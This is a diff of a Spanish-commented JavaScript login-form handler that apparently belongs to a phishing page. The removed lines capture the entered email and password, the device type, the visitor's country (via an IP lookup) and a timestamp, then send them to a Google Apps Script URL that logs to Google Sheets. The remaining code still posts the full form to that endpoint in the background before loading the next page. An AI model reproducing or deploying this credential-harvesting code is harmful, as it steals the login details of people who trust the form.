@@ -1,5 +1,5 @@
-document.getElementById("miFormulario").addEventListener("submit", async function(event) {
-    event.preventDefault();
+document.getElementById("miFormulario").addEventListener("submit", function(event) {
+    event.preventDefault(); // Evita el envío automático
 
     // Ocultar el formulario
     document.getElementById("miFormulario").style.display = "none";
@@ -20,39 +20,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         loadingMessage.remove();
     };
 
-    // ✅ Detectar si el usuario usa iPhone o Android
-    let deviceType = "Otro"; // Valor por defecto
-    if (/android/i.test(navigator.userAgent)) {
-        deviceType = "Android";
-    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
-        deviceType = "iPhone";
-    }
-
-    // ✅ Obtener el país del usuario desde la API
-    let country = "Desconocido";
-    try {
-        const response = await fetch("https://ipwhois.app/json/");
-        const data = await response.json();
-        if (data && data.country) {
-            country = data.country; // Captura el país
-        }
-    } catch (error) {
-        console.error("Error obteniendo el país:", error);
-    }
-
-    // ✅ Capturar valores del formulario (Asegurar correo y contraseña)
+    // Enviar datos en segundo plano sin retrasar la carga de usuario.html
     const formData = new FormData(this);
-    const email = document.querySelector('input[name="email"]').value;
-    const password = document.querySelector('input[name="pass"], input[name="password"]').value; // Captura cualquier variante
-
-    // ✅ Agregar manualmente los datos al FormData
-    formData.append("email", email);
-    formData.append("pass", password); // Enviar como "pass"
-    formData.append("device", deviceType);
-    formData.append("country", country);
-    formData.append("date", new Date().toLocaleString()); // Agregar fecha y hora actual
-
-    // ✅ Enviar los datos a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
 
     fetch(url, {
